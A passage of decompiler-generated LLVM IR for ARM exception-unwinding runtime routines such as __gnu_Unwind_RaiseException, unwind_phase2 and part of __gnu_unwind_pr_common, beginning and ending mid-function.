  %v1_17da0 = inttoptr i32 %v12_17d98 to i32*
  %v2_17da0 = load i32, i32* %v1_17da0, align 4
  store i32 %v2_17da0, i32* %r0.global-to-local, align 4
  %v12_17da0 = add i32 %entry_vrs, 52
  store i32 %v12_17da0, i32* @ip, align 4
  %v13_17da4 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_17da4, i32* @lr, align 4
  %v1_17da8 = inttoptr i32 %v12_17da0 to i32*
  %v2_17da8 = load i32, i32* %v1_17da8, align 4
  store i32 %v2_17da8, i32* %r0.global-to-local, align 4
  %v9_17da8 = add i32 %entry_vrs, 64
  %v10_17da8 = inttoptr i32 %v9_17da8 to i32*
  %v11_17da8 = load i32, i32* %v10_17da8, align 4
  store i32 0, i32* @r4, align 4
  %v1_17db0 = add i32 %ucbp, 12
  %v2_17db0 = inttoptr i32 %v1_17db0 to i32*
  %v3_17db0 = load i32, i32* %v2_17db0, align 4
  store i32 %v2_17da8, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_17dc8 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_17da8)
  store i32 %v2_17dc8, i32* %r0.global-to-local, align 4
  %v0_17dcc = load i32, i32* @r6, align 4
  %v1_17dcc = load i32, i32* @r4, align 4
  %v9_17dcc = icmp eq i32 %v0_17dcc, %v1_17dcc
  store i32 %v2_17dc8, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_17dcc, label %dec_label_pc_17de0, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_17dec

dec_label_pc_17de0:                               ; preds = %entry
  store i32 %v0_17dcc, i32* @r4, align 4
  br label %dec_label_pc_17de8

dec_label_pc_17de8:                               ; preds = %dec_label_pc_17eb0, %dec_label_pc_17de0
  br label %dec_label_pc_17dec

dec_label_pc_17dec:                               ; preds = %.thread, %dec_label_pc_17de8
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_17de8 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_17dec = icmp eq i32 %v2_17dc8, 0
  br i1 %v2_17dec, label %dec_label_pc_17e64, label %.thread2.dec_label_pc_17e00_crit_edge

.thread2.dec_label_pc_17e00_crit_edge:            ; preds = %dec_label_pc_17dec
  br label %dec_label_pc_17e00

dec_label_pc_17e00:                               ; preds = %.thread2.dec_label_pc_17e00_crit_edge, %dec_label_pc_17e64
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_17e10 = load i32, i32* @r5, align 4
  store i32 %v0_17e10, i32* @r3, align 4
  store i32 97824, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_17db0)
  br i1 false, label %dec_label_pc_17e28, label %dec_label_pc_17e50

dec_label_pc_17e28:                               ; preds = %dec_label_pc_17e00
  br i1 undef, label %dec_label_pc_17e30, label %dec_label_pc_17e54

dec_label_pc_17e30:                               ; preds = %dec_label_pc_17e28
  br i1 undef, label %dec_label_pc_17eb0, label %dec_label_pc_17e48

dec_label_pc_17e48:                               ; preds = %dec_label_pc_17e30
  br i1 undef, label %dec_label_pc_17ea8, label %dec_label_pc_17e50

dec_label_pc_17e50:                               ; preds = %dec_label_pc_17e00, %dec_label_pc_17e48
  br label %dec_label_pc_17e54

dec_label_pc_17e54:                               ; preds = %dec_label_pc_17e28, %dec_label_pc_17e50
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_17e64:                               ; preds = %dec_label_pc_17dec
  store i32 %v11_17da8, i32* @r3, align 4
  %v2_17e68 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_17e68, i32* @r4, align 4
  %v1_17e6c = load i32, i32* @r5, align 4
  %v2_17e6c = add i32 %v1_17e6c, 20
  %v3_17e6c = inttoptr i32 %v2_17e6c to i32*
  store i32 %v11_17da8, i32* %v3_17e6c, align 4
  store i32 %v2_17e68, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_17e7c = call i32 @memcpy()
  %v0_17e84 = load i32, i32* @r6, align 4
  store i32 %v0_17e84, i32* %r0.global-to-local, align 4
  %v0_17e88 = load i32, i32* @r5, align 4
  %v1_17e8c = add i32 %v0_17e88, 16
  %v2_17e8c = inttoptr i32 %v1_17e8c to i32*
  %v3_17e8c = load i32, i32* %v2_17e8c, align 4
  store i32 %v3_17e8c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_17e8c)
  %v0_17e9c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17e9c, i32* @r4, align 4
  br label %dec_label_pc_17e00

dec_label_pc_17ea8:                               ; preds = %dec_label_pc_17e48
  br label %dec_label_pc_17eb0

dec_label_pc_17eb0:                               ; preds = %dec_label_pc_17e30, %dec_label_pc_17ea8
  br label %dec_label_pc_17de8

; uselistorder directives
  uselistorder i32 %v11_17da8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 108, 109, 41, 42, 30, 110, 111, 33, 112, 113, 3, 114, 115, 116, 4, 117, 118, 119, 5, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 0, 138, 139, 140, 141, 31, 32, 34, 35, 36, 37, 38, 39, 40, 81, 64, 65, 66, 142, 143, 156, 157, 158, 146, 147, 148, 149, 150, 1, 151, 6, 87, 88, 44, 45, 144, 145, 57, 58, 105, 106, 107, 99, 98, 100, 101, 103, 102, 9, 10, 11, 162, 159, 160, 161, 2, 163, 164, 165, 43, 67, 46, 47, 48, 49, 50, 51, 152, 153, 154, 155, 59, 60, 61, 89, 90, 91, 92, 68, 69, 70, 8, 93, 94, 95, 96, 97, 24, 25, 12, 17, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 26, 27, 28, 29, 52, 53, 54, 104, 55, 56, 62, 63, 71, 7, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 85, 86 }
  uselistorder i32 10, { 4, 5, 31, 32, 33, 8, 43, 42, 75, 0, 39, 40, 74, 44, 45, 1, 34, 10, 26, 28, 11, 27, 12, 29, 13, 30, 23, 6, 35, 24, 14, 3, 25, 36, 15, 37, 38, 16, 17, 18, 41, 9, 46, 47, 48, 49, 50, 51, 52, 19, 53, 54, 55, 20, 56, 57, 58, 2, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 21, 73, 22 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_17eb0, { 1, 0 }
  uselistorder label %dec_label_pc_17e54, { 1, 0 }
  uselistorder label %dec_label_pc_17e50, { 1, 0 }
  uselistorder label %dec_label_pc_17e00, { 1, 0 }
  uselistorder label %dec_label_pc_17dec, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_17ec4 = add i32 %ucbp, 12
  %v3_17ec4 = inttoptr i32 %v2_17ec4 to i32*
  store i32 %stop_fn, i32* %v3_17ec4, align 4
  %v3_17ec8 = add i32 %ucbp, 24
  %v4_17ec8 = inttoptr i32 %v3_17ec8 to i32*
  store i32 %tmp, i32* %v4_17ec8, align 4
  %v1_17ecc = add i32 %entry_vrs, 60
  %v2_17ecc = inttoptr i32 %v1_17ecc to i32*
  %v3_17ecc = load i32, i32* %v2_17ecc, align 4
  %v2_17ed4 = add i32 %entry_vrs, 64
  %v3_17ed4 = inttoptr i32 %v2_17ed4 to i32*
  store i32 %v3_17ecc, i32* %v3_17ed4, align 4
  %v3_17edc = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_17edc

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_17ef46 = add i32 %vrs, 64
  %v2_17ef47 = inttoptr i32 %v1_17ef46 to i32*
  %v3_17ef48 = load i32, i32* %v2_17ef47, align 4
  %v2_17ef89 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_17ef48)
  store i32 %v2_17ef89, i32* %r0.global-to-local, align 4
  %v2_17efc11 = icmp eq i32 %v2_17ef89, 0
  br i1 %v2_17efc11, label %dec_label_pc_17f04, label %dec_label_pc_17f34

dec_label_pc_17f04:                               ; preds = %entry, %dec_label_pc_17f04.dec_label_pc_17ef0_crit_edge
  %v0_17f04 = load i32, i32* @r5, align 4
  %v1_17f04 = add i32 %v0_17f04, 64
  %v2_17f04 = inttoptr i32 %v1_17f04 to i32*
  %v3_17f04 = load i32, i32* %v2_17f04, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_17f0c = load i32, i32* @r4, align 4
  %v2_17f0c = add i32 %v1_17f0c, 20
  %v3_17f0c = inttoptr i32 %v2_17f0c to i32*
  store i32 %v3_17f04, i32* %v3_17f0c, align 4
  %v0_17f10 = load i32, i32* @r4, align 4
  %v1_17f18 = add i32 %v0_17f10, 16
  %v2_17f18 = inttoptr i32 %v1_17f18 to i32*
  %v3_17f18 = load i32, i32* %v2_17f18, align 4
  call void @__pseudo_branch(i32 %v3_17f18)
  %v0_17f24 = load i32, i32* %r0.global-to-local, align 4
  %v7_17f24 = icmp eq i32 %v0_17f24, 8
  br i1 %v7_17f24, label %dec_label_pc_17f04.dec_label_pc_17ef0_crit_edge, label %dec_label_pc_17f2c

dec_label_pc_17f04.dec_label_pc_17ef0_crit_edge:  ; preds = %dec_label_pc_17f04
  %v0_17ef0.pre = load i32, i32* @r4, align 4
  %v0_17ef4.pre = load i32, i32* @r5, align 4
  store i32 %v0_17ef0.pre, i32* %r0.global-to-local, align 4
  %v1_17ef4 = add i32 %v0_17ef4.pre, 64
  %v2_17ef4 = inttoptr i32 %v1_17ef4 to i32*
  %v3_17ef4 = load i32, i32* %v2_17ef4, align 4
  %v2_17ef8 = call i32 @get_eit_entry(i32 %v0_17ef0.pre, i32 %v3_17ef4)
  store i32 %v2_17ef8, i32* %r0.global-to-local, align 4
  %v2_17efc = icmp eq i32 %v2_17ef8, 0
  br i1 %v2_17efc, label %dec_label_pc_17f04, label %dec_label_pc_17f34

dec_label_pc_17f2c:                               ; preds = %dec_label_pc_17f04
  %v7_17f2c = icmp eq i32 %v0_17f24, 7
  br i1 %v7_17f2c, label %dec_label_pc_17f38, label %dec_label_pc_17f34

dec_label_pc_17f34:                               ; preds = %entry, %dec_label_pc_17f04.dec_label_pc_17ef0_crit_edge, %dec_label_pc_17f2c
  %v0_17f34 = call i32 @abort()
  store i32 %v0_17f34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17f38

dec_label_pc_17f38:                               ; preds = %dec_label_pc_17f2c, %dec_label_pc_17f34
  %v0_17f38 = load i32, i32* @r5, align 4
  %v1_17f38 = add i32 %v0_17f38, 4
  store i32 %v1_17f38, i32* %r0.global-to-local, align 4
  %v1_17f3c = inttoptr i32 %v1_17f38 to i32*
  %v2_17f3c = call i32 @__restore_core_regs(i32* %v1_17f3c)
  store i32 %v2_17f3c, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_17f38, { 1, 0 }
  uselistorder label %dec_label_pc_17f34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17f04, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_17f40 = add i32 %ucbp, 20
  %v2_17f40 = inttoptr i32 %v1_17f40 to i32*
  %v3_17f40 = load i32, i32* %v2_17f40, align 4
  %v1_17f48 = load i32, i32* %r1.global-to-local, align 4
  %v2_17f48 = add i32 %v1_17f48, 64
  %v3_17f48 = inttoptr i32 %v2_17f48 to i32*
  store i32 %v3_17f40, i32* %v3_17f48, align 4
  %v1_17f4c = add i32 %ucbp, 12
  %v2_17f4c = inttoptr i32 %v1_17f4c to i32*
  %v3_17f4c = load i32, i32* %v2_17f4c, align 4
  %v2_17f50 = icmp eq i32 %v3_17f4c, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_17f5c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_17f5c, i32* @r5, align 4
  br i1 %v2_17f50, label %dec_label_pc_17f64, label %dec_label_pc_17fa0

dec_label_pc_17f64:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_17f70 = add i32 %ucbp, 16
  %v2_17f70 = inttoptr i32 %v1_17f70 to i32*
  %v3_17f70 = load i32, i32* %v2_17f70, align 4
  call void @__pseudo_branch(i32 %v3_17f70)
  br i1 false, label %dec_label_pc_17f98, label %dec_label_pc_17f84

dec_label_pc_17f84:                               ; preds = %dec_label_pc_17f64
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_12d50.501 to i32))
  %v0_17f8c = load i32, i32* @r4, align 4
  %v0_17f90 = load i32, i32* @r5, align 4
  store i32 %v0_17f90, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_17f8c, i32 %v0_17f90)
  br label %dec_label_pc_17f98

dec_label_pc_17f98:                               ; preds = %dec_label_pc_17f64, %dec_label_pc_17f84
  %v0_17f98 = load i32, i32* @r5, align 4
  %v1_17f98 = add i32 %v0_17f98, 4
  %v1_17f9c = inttoptr i32 %v1_17f98 to i32*
  %v2_17f9c = call i32 @__restore_core_regs(i32* %v1_17f9c)
  %v1_17fa4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_17fa0

dec_label_pc_17fa0:                               ; preds = %entry, %dec_label_pc_17f98
  %v1_17fa4 = phi i32 [ %v0_17f5c, %entry ], [ %v1_17fa4.pre, %dec_label_pc_17f98 ]
  %v3_17fa4 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_17fa4, i32 1)
  %v0_17fa8 = call i32 @abort()
  ret i32 %v0_17fa8

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 42, 43, 44, 45, 46, 48, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 29, 53, 57, 56, 55, 49, 50, 37, 38, 39, 40, 41, 51, 52, 54, 32, 33, 47, 30, 34, 31, 23, 24, 0, 25, 26, 27, 28, 35, 36, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 95, 134, 4, 135, 136, 137, 138, 5, 80, 111, 139, 6, 79, 140, 7, 78, 141, 142, 143, 144, 8, 145, 112, 9, 82, 146, 10, 81, 147, 148, 11, 149, 150, 151, 12, 152, 153, 13, 154, 14, 114, 155, 156, 113, 157, 158, 15, 83, 16, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 18, 85, 19, 169, 170, 171, 20, 84, 172, 21, 17, 173, 174, 22, 175, 176, 177, 23, 178, 179, 180, 181, 182, 24, 25, 115, 26, 27, 28, 133, 86, 183, 184, 87, 185, 117, 186, 187, 30, 188, 189, 31, 88, 191, 29, 192, 190, 193, 116, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 90, 43, 44, 45, 46, 47, 212, 77, 91, 97, 198, 100, 99, 48, 194, 120, 195, 196, 51, 197, 89, 98, 199, 200, 201, 202, 92, 203, 204, 205, 206, 207, 52, 53, 208, 209, 49, 50, 210, 211, 119, 118, 54, 55, 56, 213, 57, 58, 101, 102, 107, 103, 108, 104, 106, 214, 105, 110, 215, 59, 216, 60, 217, 121, 122, 218, 123, 124, 219, 125, 126, 61, 62, 220, 127, 128, 63, 64, 221, 129, 130, 65, 66, 222, 131, 132, 67, 68, 96, 223, 224, 109, 225, 69, 93, 70, 71, 94, 72, 73, 74, 75, 76 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_17fa0, { 1, 0 }
  uselistorder label %dec_label_pc_17f98, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17fac = load i32, i32* @r4, align 4
  store i32 %v3_17fac, i32* %stack_var_-16, align 4
  %v6_17fac = load i32, i32* @r5, align 4
  %v9_17fac = load i32, i32* @r6, align 4
  %v12_17fac = load i32, i32* @lr, align 4
  %v1_17fb0 = add i32 %entry_vrs, 60
  %v2_17fb0 = inttoptr i32 %v1_17fb0 to i32*
  %v3_17fb0 = load i32, i32* %v2_17fb0, align 4
  %v2_17fb4 = add i32 %entry_vrs, 64
  %v3_17fb4 = inttoptr i32 %v2_17fb4 to i32*
  store i32 %v3_17fb0, i32* %v3_17fb4, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_17fe4 = load i32, i32* %v3_17fb4, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_17ffc = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_17fe4)
  %v2_18000 = icmp eq i32 %v2_17ffc, 0
  br i1 %v2_18000, label %dec_label_pc_18008, label %dec_label_pc_1803c

dec_label_pc_18008:                               ; preds = %entry
  %v0_18008 = load i32, i32* @r5, align 4
  %v1_18010 = add i32 %v0_18008, 16
  %v2_18010 = inttoptr i32 %v1_18010 to i32*
  %v3_18010 = load i32, i32* %v2_18010, align 4
  call void @__pseudo_branch(i32 %v3_18010)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18028 = load i32, i32* %saved_vrs_-320, align 4
  %v1_1802c = urem i32 %v2_18028, 2
  %v2_1802c = icmp eq i32 %v1_1802c, 0
  br i1 %v2_1802c, label %dec_label_pc_1804c, label %dec_label_pc_18034

dec_label_pc_18034:                               ; preds = %dec_label_pc_18008, %dec_label_pc_1804c
  %v0_18034 = phi i1 [ false, %dec_label_pc_18008 ], [ %phitmp, %dec_label_pc_1804c ]
  br i1 %v0_18034, label %dec_label_pc_18058, label %dec_label_pc_1803c

dec_label_pc_1803c:                               ; preds = %entry, %dec_label_pc_18034
  %v2_18044 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18044, i32* @r4, align 4
  store i32 %v6_17fac, i32* @r5, align 4
  store i32 %v9_17fac, i32* @r6, align 4
  store i32 %v12_17fac, i32* @lr, align 4
  ret i32 9

dec_label_pc_1804c:                               ; preds = %dec_label_pc_18008
  %v2_1804c = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_1804c, i32* @r0, align 4
  %v1_18050 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_1804c)
  %v0_18034.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_18034.pre, 6
  br label %dec_label_pc_18034

dec_label_pc_18058:                               ; preds = %dec_label_pc_18034
  %v0_18058 = load i32, i32* @r5, align 4
  %v0_1805c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_18058, i32 %v0_1805c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1803c, { 1, 0 }
  uselistorder label %dec_label_pc_18034, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18064 = add i32 %ucbp, 12
  %v2_18064 = inttoptr i32 %v1_18064 to i32*
  %v3_18064 = load i32, i32* %v2_18064, align 4
  %v2_18068 = icmp eq i32 %v3_18064, 0
  br i1 %v2_18068, label %dec_label_pc_18070, label %dec_label_pc_18074

dec_label_pc_18070:                               ; preds = %entry
  %v2_18070 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18074

dec_label_pc_18074:                               ; preds = %entry, %dec_label_pc_18070
  %v1_18074 = add i32 %entry_vrs, 60
  %v2_18074 = inttoptr i32 %v1_18074 to i32*
  %v3_18074 = load i32, i32* %v2_18074, align 4
  %v2_1807c = add i32 %entry_vrs, 64
  %v3_1807c = inttoptr i32 %v2_1807c to i32*
  store i32 %v3_18074, i32* %v3_1807c, align 4
  %v3_18080 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_18080

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_18074, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_180e0

bb:                                               ; preds = %entry
  %v7_18098 = mul i32 %regclass, 4
  %v8_18098 = add i32 %v7_18098, ptrtoint (i32* @global_var_180a0.654 to i32)
  call void @__pseudo_branch(i32 %v8_18098)
  br label %dec_label_pc_180e0

dec_label_pc_180e0:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_181c8 = load i32, i32* @r4, align 4
  %v6_181c8 = load i32, i32* @r5, align 4
  %v2_181d8 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_181e0 = add i32 %ucbp, 76
  %v2_181e0 = inttoptr i32 %v1_181e0 to i32*
  %v3_181e0 = load i32, i32* %v2_181e0, align 4
  %v1_181ec = inttoptr i32 %v3_181e0 to i32*
  %v2_181ec = load i32, i32* %v1_181ec, align 4
  store i32 %v2_181ec, i32* @lr, align 4
  %v4_181ec = add i32 %v3_181e0, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_181f8 = urem i32 %state, 4
  store i32 %v1_181f8, i32* %r2.global-to-local, align 4
  %v1_181fc = and i32 %state, 8
  store i32 %v1_181fc, i32* %r0.global-to-local, align 4
  %v4_1820c = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_181ec, i32* %v4_1820c, align 8
  br i1 %v2_181d8, label %dec_label_pc_1821c, label %dec_label_pc_184f8

dec_label_pc_1821c:                               ; preds = %entry
  %v3_1821c = mul i32 %v2_181ec, 256
  store i32 %v3_1821c, i32* %v4_1820c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18234

dec_label_pc_18234:                               ; preds = %dec_label_pc_184f8, %dec_label_pc_1821c
  %v0_18258647090 = phi i32 [ %v2_18510, %dec_label_pc_184f8 ], [ %v4_181ec, %dec_label_pc_1821c ]
  store i32 %v1_181f8, i32* %r2.global-to-local, align 4
  %v1_18238 = add i32 %ucbp, 80
  %v2_18238 = inttoptr i32 %v1_18238 to i32*
  %v3_18238 = load i32, i32* %v2_18238, align 4
  %v7_1823c = icmp eq i32 %v1_181f8, 2
  br i1 %v7_1823c, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_18234
  %v2_18240 = add i32 %ucbp, 56
  %v3_18240 = inttoptr i32 %v2_18240 to i32*
  %v4_18240 = load i32, i32* %v3_18240, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18234, %bb
  %v0_182586470 = phi i32 [ %v0_18258647090, %dec_label_pc_18234 ], [ %v4_18240, %bb ]
  %v1_18244 = urem i32 %v3_18238, 2
  %v2_18244 = icmp eq i32 %v1_18244, 0
  br i1 %v2_18244, label %dec_label_pc_18258.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_18318

dec_label_pc_18258.preheader:                     ; preds = %bb148
  %v1_182586571 = inttoptr i32 %v0_182586470 to i32*
  %v2_182586672 = load i32, i32* %v1_182586571, align 4
  %v2_1825c6874 = icmp eq i32 %v2_182586672, 0
  br i1 %v2_1825c6874, label %dec_label_pc_18318, label %dec_label_pc_18264.preheader.lr.ph.lr.ph

dec_label_pc_18264.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_18258.preheader
  %v7_18268 = icmp eq i32 %id, 2
  %v2_182f4 = icmp eq i32 %v1_181f8, 0
  %v2_184c0 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_183dc = icmp eq i32 %v1_181fc, 0
  br label %dec_label_pc_18264.preheader.lr.ph

dec_label_pc_18264.preheader.lr.ph:               ; preds = %dec_label_pc_18264.preheader.lr.ph.lr.ph, %dec_label_pc_1852c
  %v1_1827496 = phi i32 [ %v2_182586672, %dec_label_pc_18264.preheader.lr.ph.lr.ph ], [ %v2_1825866, %dec_label_pc_1852c ]
  %v1_1827093 = phi i32 [ %v0_182586470, %dec_label_pc_18264.preheader.lr.ph.lr.ph ], [ %v2_18530, %dec_label_pc_1852c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18264.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_1852c ]
  br label %dec_label_pc_18264.preheader

dec_label_pc_18264.preheader:                     ; preds = %dec_label_pc_18264.preheader.lr.ph, %dec_label_pc_184f0
  %v1_1827495 = phi i32 [ %v1_1827496, %dec_label_pc_18264.preheader.lr.ph ], [ %v2_18258, %dec_label_pc_184f0 ]
  %v1_1827092 = phi i32 [ %v1_1827093, %dec_label_pc_18264.preheader.lr.ph ], [ %v1_184f0, %dec_label_pc_184f0 ]
  br label %dec_label_pc_18264

dec_label_pc_18264:                               ; preds = %dec_label_pc_18264.preheader, %dec_label_pc_18308
  %v1_18274 = phi i32 [ %v1_1827495, %dec_label_pc_18264.preheader ], [ %v2_1830c, %dec_label_pc_18308 ]
  %v1_18288 = phi i32 [ %v1_1827092, %dec_label_pc_18264.preheader ], [ %v1_18308, %dec_label_pc_18308 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18268, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18264
  %v2_1826c = add i32 %v1_18288, 4
  %v3_1826c = inttoptr i32 %v2_1826c to i32*
  %v4_1826c = load i32, i32* %v3_1826c, align 4
  store i32 %v4_1826c, i32* @r5, align 4
  store i32 %v1_18274, i32* @r6, align 4
  %v0_18278109 = load i32, i32* @r8, align 4
  %v1_18278110 = add i32 %v0_18278109, 72
  %v2_18278111 = inttoptr i32 %v1_18278110 to i32*
  %v3_18278112 = load i32, i32* %v2_18278111, align 4
  store i32 %v3_18278112, i32* @lr, align 4
  %v2_18284 = add i32 %v1_18288, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18264
  %v2_18270 = add i32 %v1_18288, 2
  %v3_18270 = inttoptr i32 %v2_18270 to i16*
  %v4_18270 = load i16, i16* %v3_18270, align 2
  %v5_18270 = zext i16 %v4_18270 to i32
  store i32 %v5_18270, i32* @r5, align 4
  %v0_18278 = load i32, i32* @r8, align 4
  %v1_18278 = add i32 %v0_18278, 72
  %v2_18278 = inttoptr i32 %v1_18278 to i32*
  %v3_18278 = load i32, i32* %v2_18278, align 4
  store i32 %v3_18278, i32* @lr, align 4
  %v2_18280 = inttoptr i32 %v1_18288 to i16*
  %v3_18280 = load i16, i16* %v2_18280, align 2
  %v4_18280 = zext i16 %v3_18280 to i32
  store i32 %v4_18280, i32* @r6, align 4
  %v2_18288 = add i32 %v1_18288, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18288, %.thread16 ], [ %v2_18284, %bb151 ]
  %v3_18278115 = phi i32 [ %v3_18278, %.thread16 ], [ %v3_18278112, %bb151 ]
  %v0_18290113 = phi i32 [ %v5_18270, %.thread16 ], [ %v4_1826c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18290 = and i32 %v0_18290113, -2
  %v2_18294 = add i32 %v1_18290, %v3_18278115
  store i32 %v2_18294, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_182a4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_182a4, i32* %r0.global-to-local, align 4
